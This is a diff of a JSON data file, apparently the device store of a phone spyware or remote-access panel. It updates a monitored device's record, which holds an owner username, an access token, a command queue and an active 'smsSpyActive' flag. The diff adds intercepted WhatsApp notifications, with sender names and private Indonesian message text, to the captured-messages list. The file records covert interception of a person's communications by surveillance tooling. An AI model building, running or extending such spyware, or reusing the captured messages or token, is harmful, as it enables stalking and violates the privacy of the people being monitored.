@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775925731239,
+    "lastSeen": 1775925740072,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ Rusjie",
+        "content": "kok gua udah masuk 😳",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925742242
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4 pesan dari 2 chat",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925742160
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
